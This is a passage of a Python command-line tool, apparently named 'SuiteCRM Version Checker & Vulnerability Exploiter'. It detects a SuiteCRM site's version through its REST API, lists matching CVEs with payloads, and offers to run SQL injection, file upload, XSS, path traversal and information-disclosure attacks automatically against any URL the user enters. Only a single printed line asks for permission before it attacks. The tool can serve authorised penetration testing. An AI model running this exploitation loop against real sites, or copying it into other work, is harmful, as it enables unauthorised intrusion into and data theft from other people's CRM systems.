    endpoints = get_endpoints_for_cve(cve_id, cve_type)
    
    print(f"\n🎯 EXPLOITING {cve_id} - {cve['description']}")
    print(f"   Type: {cve_type.upper()}")
    print(f"   Severity: {cve['severity']} (CVSS: {cve['cvss']})")
    print("   " + "-" * 50)
    
    success_count = 0
    total_tests = 0
    
    for endpoint in endpoints:
        print(f"\n   📍 Testing endpoint: {endpoint}")
        
        if cve_type == "sql_injection":
            for payload in payloads[:3]:  # Test first 3 payloads
                total_tests += 1
                success, result = test_sql_injection(base_url, endpoint, payload, session)
                if success:
                    success_count += 1
                    print(f"      🚨 VULNERABILITY CONFIRMED: {result}")
                time.sleep(1)  # Rate limiting
                
        elif cve_type == "file_upload":
            for payload in payloads[:2]:  # Test first 2 payloads
                total_tests += 1
                success, result = test_file_upload(base_url, endpoint, payload, session)
                if success:
                    success_count += 1
                    print(f"      🚨 VULNERABILITY CONFIRMED: {result}")
                time.sleep(2)  # Rate limiting
                
        elif cve_type == "xss":
            for payload in payloads[:3]:  # Test first 3 payloads
                total_tests += 1
                success, result = test_xss(base_url, endpoint, payload, session)
                if success:
                    success_count += 1
                    print(f"      🚨 VULNERABILITY CONFIRMED: {result}")
                time.sleep(1)  # Rate limiting
                
        elif cve_type == "path_traversal":
            for payload in payloads[:3]:  # Test first 3 payloads
                total_tests += 1
                success, result = test_path_traversal(base_url, endpoint, payload, session)
                if success:
                    success_count += 1
                    print(f"      🚨 VULNERABILITY CONFIRMED: {result}")
                time.sleep(1)  # Rate limiting
                
        elif cve_type == "information_disclosure":
            total_tests += 1
            success, result = test_information_disclosure(base_url, endpoint, session)
            if success:
                success_count += 1
                print(f"      🚨 VULNERABILITY CONFIRMED: {result}")
            time.sleep(1)  # Rate limiting
    
    print(f"\n   📊 EXPLOITATION SUMMARY:")
    print(f"      Tests performed: {total_tests}")
    print(f"      Successful exploits: {success_count}")
    print(f"      Success rate: {(success_count/total_tests*100):.1f}%" if total_tests > 0 else "      Success rate: 0%")
    
    if success_count > 0:
        print(f"      🚨 {cve_id} IS VULNERABLE AND EXPLOITABLE!")
        return True
    else:
        print(f"      ✅ {cve_id} appears to be patched or not exploitable")
        return False

def analyze_cves(version_string):
    """Analyze CVEs for the detected SuiteCRM version"""
    print("\n" + "="*60)
    print("🔍 VULNERABILITY ANALYSIS")
    print("="*60)
    
    version = extract_version_from_string(version_string)
    if not version:
        print("❌ Could not extract version from: " + version_string)
        return
    
    print(f"📋 Detected Version: {version}")
    
    matching_version = find_matching_version(version)
    if not matching_version:
        print(f"⚠️  No CVE data available for version {version}")
        print("💡 Consider checking for CVEs manually or updating the CVE database")
        return
    
    if matching_version != version:
        print(f"📌 Using CVE data for closest version: {matching_version}")
    
    cves = SUITECRM_CVES[matching_version]["cves"]
    
    # Count by severity
    severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for cve in cves:
        severity_counts[cve["severity"]] += 1
    
    print(f"\n📊 VULNERABILITY SUMMARY:")
    print(f"   🔴 Critical: {severity_counts['CRITICAL']}")
    print(f"   🟠 High:     {severity_counts['HIGH']}")
    print(f"   🟡 Medium:   {severity_counts['MEDIUM']}")
    print(f"   🟢 Low:      {severity_counts['LOW']}")
    print(f"   📈 Total:    {len(cves)}")
    
    # Show critical and high severity CVEs first
    critical_high = [cve for cve in cves if cve["severity"] in ["CRITICAL", "HIGH"]]
    if critical_high:
        print(f"\n🚨 HIGH PRIORITY VULNERABILITIES:")
        for cve in critical_high:
            severity_icon = "🔴" if cve["severity"] == "CRITICAL" else "🟠"
            print(f"   {severity_icon} {cve['id']} - {cve['severity']} (CVSS: {cve['cvss']})")
            print(f"      {cve['description']}")
            print()
    
    # Show all CVEs with payloads
    print(f"\n📋 ALL VULNERABILITIES FOR {matching_version}:")
    for i, cve in enumerate(cves, 1):
        severity_icon = {
            "CRITICAL": "🔴",
            "HIGH": "🟠", 
            "MEDIUM": "🟡",
            "LOW": "🟢"
        }.get(cve["severity"], "⚪")
        
        print(f"   {i:2d}. {severity_icon} {cve['id']} - {cve['severity']} (CVSS: {cve['cvss']})")
        print(f"       {cve['description']}")
        
        # Determine CVE type from description
        cve_type = determine_cve_type(cve['description'])
        
        # Generate and display payloads
        payloads = generate_payloads(cve['id'], cve_type)
        endpoints = get_endpoints_for_cve(cve['id'], cve_type)
        
        print(f"       🎯 CVE Type: {cve_type.upper()}")
        print(f"       📍 Endpoints:")
        for endpoint in endpoints[:3]:  # Show first 3 endpoints
            print(f"          • {endpoint}")
        if len(endpoints) > 3:
            print(f"          • ... and {len(endpoints) - 3} more")
        
        print(f"       💣 Payloads:")
        for j, payload in enumerate(payloads[:3], 1):  # Show first 3 payloads
            print(f"          {j}. {payload}")
        if len(payloads) > 3:
            print(f"          ... and {len(payloads) - 3} more payloads")
        
        print()
    
    # Recommendations
    print("💡 RECOMMENDATIONS:")
    if severity_counts['CRITICAL'] > 0:
        print("   🔴 IMMEDIATE ACTION REQUIRED - Critical vulnerabilities detected!")
        print("   📝 Update to the latest SuiteCRM version immediately")
    elif severity_counts['HIGH'] > 0:
        print("   🟠 HIGH PRIORITY - High severity vulnerabilities detected")
        print("   📝 Plan immediate update to latest version")
    elif severity_counts['MEDIUM'] > 0:
        print("   🟡 MEDIUM PRIORITY - Medium severity vulnerabilities detected")
        print("   📝 Schedule update to latest version")
    else:
        print("   ✅ No high-priority vulnerabilities detected")
    
    print("   🔗 Check official SuiteCRM security advisories")
    print("   🛡️  Implement additional security measures")
    print("   📊 Regular security assessments recommended")

def get_suitecrm_version(base_url, verify_ssl=True, use_self_signed=False):
    # Normalize the base URL - remove trailing slashes and fix double slashes
    base_url = base_url.rstrip('/')
    # Fix double slashes in the URL (except after protocol)
    base_url = re.sub(r'(?<!:)//+', '/', base_url)
    
    # Define the base extractor paths
    extractors = [
        "service/v4_1/rest.php?method=get_server_info&input_type=JSON&response_type=JSON",
        "legacy/service/v4_1/rest.php?method=get_server_info&input_type=JSON&response_type=JSON",
        "service/v4/rest.php?method=get_server_info&input_type=JSON&response_type=JSON",
        "service/v2/rest.php?method=get_server_info&input_type=JSON&response_type=JSON"
    ]
    
    # Create session with custom SSL handling
    session = requests.Session()
    
    # Configure SSL handling
    if not verify_ssl or use_self_signed:
        session.verify = False
        # Add retry strategy for better reliability
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
    
    for extractor in extractors:
        api_url = f"{base_url}/{extractor}"
        print(f"Trying: {api_url}")
        
        try:
            response = session.get(api_url, timeout=10, verify=verify_ssl)
            print(f"Status: {response.status_code}")
            if response.status_code == 200:
                try:
                    info = response.json()
                    if 'version' in info:
                        suite_version = info.get('suitecrm_version', 'Not specified')
                        sugar_version = info.get('version', 'Unknown')
                        flavor = info.get('flavor', 'Unknown')
                        gmt_time = info.get('gmt_time', 'Unknown')
                        if flavor == 'CE' and suite_version != 'Not specified':
                            return f"SuiteCRM Version: {suite_version} (SugarCRM base: {sugar_version}, GMT Time: {gmt_time})"
                        elif flavor == 'CE':
                            return f"SugarCRM CE Version: {sugar_version} (likely SuiteCRM, GMT Time: {gmt_time})"
                        else:
                            return f"Flavor: {flavor}, Version: {sugar_version} (GMT Time: {gmt_time})"
                except ValueError:
                    pass  # Not JSON
        except requests.exceptions.SSLError as e:
            print(f"SSL Error: {str(e)[:100]}...")
            pass  # Continue to next extractor
        except requests.RequestException as e:
            print(f"Request Error: {str(e)[:100]}...")
            pass  # Continue to next extractor
    
    # If all GET attempts fail, fall back to POST on primary endpoints
    post_endpoints = [
        '/service/v4_1/rest.php',
        '/legacy/service/v4_1/rest.php'
    ]
    data = {
        'method': 'get_server_info',
        'input_type': 'JSON',
        'response_type': 'JSON'
    }
    
    for endpoint in post_endpoints:
        api_url = base_url + endpoint
        print(f"Trying POST: {api_url}")
        try:
            response = session.post(api_url, data=data, timeout=10, verify=verify_ssl)
            print(f"POST Status: {response.status_code}")
            if response.status_code == 200:
                try:
                    info = response.json()
                    if 'version' in info:
                        suite_version = info.get('suitecrm_version', 'Not specified')
                        sugar_version = info.get('version', 'Unknown')
                        flavor = info.get('flavor', 'Unknown')
                        gmt_time = info.get('gmt_time', 'Unknown')
                        if flavor == 'CE' and suite_version != 'Not specified':
                            return f"SuiteCRM Version: {suite_version} (SugarCRM base: {sugar_version}, GMT Time: {gmt_time})"
                        elif flavor == 'CE':
                            return f"SugarCRM CE Version: {sugar_version} (likely SuiteCRM, GMT Time: {gmt_time})"
                        else:
                            return f"Flavor: {flavor}, Version: {sugar_version} (GMT Time: {gmt_time})"
                except ValueError:
                    pass  # Not JSON
        except requests.exceptions.SSLError as e:
            print(f"POST SSL Error: {str(e)[:100]}...")
            pass
        except requests.RequestException as e:
            print(f"POST Request Error: {str(e)[:100]}...")
            pass
    
    return "Could not retrieve version. The site may not be SuiteCRM, the API may be disabled, or authentication may be required in newer versions."

if __name__ == "__main__":
    print("SuiteCRM Version Checker & Vulnerability Exploiter")
    print("=" * 50)
    
    while True:
        # Ask for website URL
        base_url = input("\nEnter the website URL (e.g., https://example.com): ").strip()
        
        # Validate URL format
        if not base_url:
            print("Please enter a valid URL.")
            continue
            
        # Add protocol if missing
        if not base_url.startswith(('http://', 'https://')):
            base_url = 'https://' + base_url
            print(f"Added https:// protocol: {base_url}")
        
        # Ask about SSL verification
        print("\nSSL Certificate Options:")
        print("1. Verify SSL certificates (strict)")
        print("2. Skip SSL verification (for self-signed certs)")
        print("3. Auto-detect (try strict first, then skip)")
        
        ssl_choice = input("Choose option (1/2/3, default=3): ").strip()
        
        if ssl_choice == "1":
            verify_ssl = True
            use_self_signed = False
            ssl_mode = "Strict SSL Verification"
        elif ssl_choice == "2":
            verify_ssl = False
            use_self_signed = True
            ssl_mode = "Self-signed SSL (No Verification)"
        else:  # Default to auto-detect
            verify_ssl = True
            use_self_signed = False
            ssl_mode = "Auto-detect SSL"
        
        print(f"\nChecking SuiteCRM version for: {base_url}")
        print(f"SSL Mode: {ssl_mode}")
        print("-" * 50)
        
        # Get and display version
        version = get_suitecrm_version(base_url, verify_ssl, use_self_signed)
        
        # If auto-detect failed with strict SSL, try with self-signed
        if ssl_choice == "3" and "Could not retrieve version" in version:
            print("\nStrict SSL failed, trying with self-signed SSL support...")
            print("-" * 50)
            version = get_suitecrm_version(base_url, False, True)
        
        print(version)
        
        # Analyze CVEs if version was successfully detected
        if "Could not retrieve version" not in version and "SuiteCRM Version:" in version:
            analyze_cves(version)
            
            # Ask if user wants to exploit vulnerabilities
            exploit_choice = input("\n🚀 Do you want to automatically test/exploit these vulnerabilities? (y/n): ").strip().lower()
            if exploit_choice in ['y', 'yes']:
                print("\n" + "="*60)
                print("🚀 AUTOMATIC VULNERABILITY EXPLOITATION")
                print("="*60)
                print("⚠️  WARNING: This will attempt to exploit vulnerabilities!")
                print("📝 Only use on systems you own or have explicit permission to test.")
                print()
                
                # Create session for exploitation with same SSL settings as version detection
                exploit_session = requests.Session()
                
                # Determine which SSL approach actually worked for version detection
                if ssl_choice == "1":
                    # User chose strict SSL verification
                    exploit_session.verify = True
                elif ssl_choice == "2":
                    # User chose to skip SSL verification
                    exploit_session.verify = False
                else:  # ssl_choice == "3" (auto-detect)
                    # Check if version detection succeeded with strict SSL or fell back to self-signed
                    if "Could not retrieve version" not in version:
                        # Version detection succeeded, use the same SSL setting that worked
                        exploit_session.verify = verify_ssl
                    else:
                        # Version detection failed, this shouldn't happen if we reach exploitation
                        exploit_session.verify = False
                
                # Add retry strategy for better reliability
                retry_strategy = Retry(
                    total=3,
                    backoff_factor=1,
                    status_forcelist=[429, 500, 502, 503, 504],
                )
                adapter = HTTPAdapter(max_retries=retry_strategy)
                exploit_session.mount("http://", adapter)
                exploit_session.mount("https://", adapter)
                
                print(f"🔧 Using SSL verification: {exploit_session.verify}")
                
                # Get version and find matching CVEs
                detected_version = extract_version_from_string(version)
                matching_version = find_matching_version(detected_version)
                
                if matching_version and matching_version in SUITECRM_CVES:
                    all_cves = SUITECRM_CVES[matching_version]["cves"]
                    
                    # Filter CVEs that are applicable to the detected version
                    applicable_cves = []
                    for cve in all_cves:
                        if is_cve_applicable_to_version(cve, detected_version, matching_version):
                            applicable_cves.append(cve)
                    
                    if not applicable_cves:
                        print("❌ No applicable vulnerabilities found for this version")
                        continue
                    
                    # Sort by severity (Critical first)
                    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
                    applicable_cves.sort(key=lambda x: severity_order.get(x["severity"], 4))
                    
                    print(f"🎯 Found {len(applicable_cves)} applicable vulnerabilities to test")
                    print(f"📋 Testing vulnerabilities for version: {matching_version}")
                    print(f"🔧 SSL Verification: {exploit_session.verify}")
                    print()
                    
                    exploited_count = 0
                    total_vulnerabilities = len(applicable_cves)
                    
                    for i, cve in enumerate(applicable_cves, 1):
                        print(f"\n{'='*60}")
                        print(f"🔍 TESTING VULNERABILITY {i}/{total_vulnerabilities}")
                        print(f"{'='*60}")
                        
                        try:
                            # Exploit the vulnerability
                            is_exploitable = exploit_vulnerability(base_url, cve, exploit_session)
                            if is_exploitable:
                                exploited_count += 1
                        except requests.exceptions.SSLError as e:
                            print(f"❌ SSL Error during exploitation: {str(e)[:100]}...")
                            print("💡 Try running with SSL verification disabled (option 2)")
                            continue
                        except requests.exceptions.ConnectionError as e:
                            print(f"❌ Connection Error: {str(e)[:100]}...")
                            continue
                        except Exception as e:
                            print(f"❌ Unexpected error: {str(e)[:100]}...")
                            continue
                        
                        # Ask if user wants to continue after each vulnerability
                        if i < total_vulnerabilities:
                            continue_choice = input(f"\n⏭️  Continue to next vulnerability? (y/n/s=skip remaining): ").strip().lower()
                            if continue_choice in ['n', 'no']:
                                print("🛑 Exploitation stopped by user")
                                break
                            elif continue_choice in ['s', 'skip']:
                                print("⏭️  Skipping remaining vulnerabilities")
                                break
                    
                    # Final summary
                    print(f"\n{'='*60}")
                    print("📊 EXPLOITATION SUMMARY")
                    print(f"{'='*60}")
                    print(f"🎯 Total vulnerabilities tested: {min(i, total_vulnerabilities)}")
                    print(f"🚨 Successfully exploited: {exploited_count}")
                    print(f"✅ Not exploitable/patched: {min(i, total_vulnerabilities) - exploited_count}")
                    print(f"📈 Exploitation rate: {(exploited_count/min(i, total_vulnerabilities)*100):.1f}%" if min(i, total_vulnerabilities) > 0 else "📈 Exploitation rate: 0%")
                    
                    if exploited_count > 0:
                        print(f"\n🚨 CRITICAL: {exploited_count} vulnerabilities are exploitable!")
                        print("📝 Immediate action required to patch these vulnerabilities.")
                    else:
                        print(f"\n✅ Good news: No exploitable vulnerabilities found!")
                        print("📝 The system appears to be properly patched.")
                else:
                    print("❌ No CVE data available for this version")
                    
        elif "Could not retrieve version" not in version and "Version:" in version:
            analyze_cves(version)
        
        # Ask if user wants to check another site
        while True:
            another = input("\nCheck another website? (y/n): ").strip().lower()
            if another in ['y', 'yes', 'n', 'no']:
                break
            print("Please enter 'y' for yes or 'n' for no.")
        
        if another in ['n', 'no']:
            print("\nGoodbye!")
            break
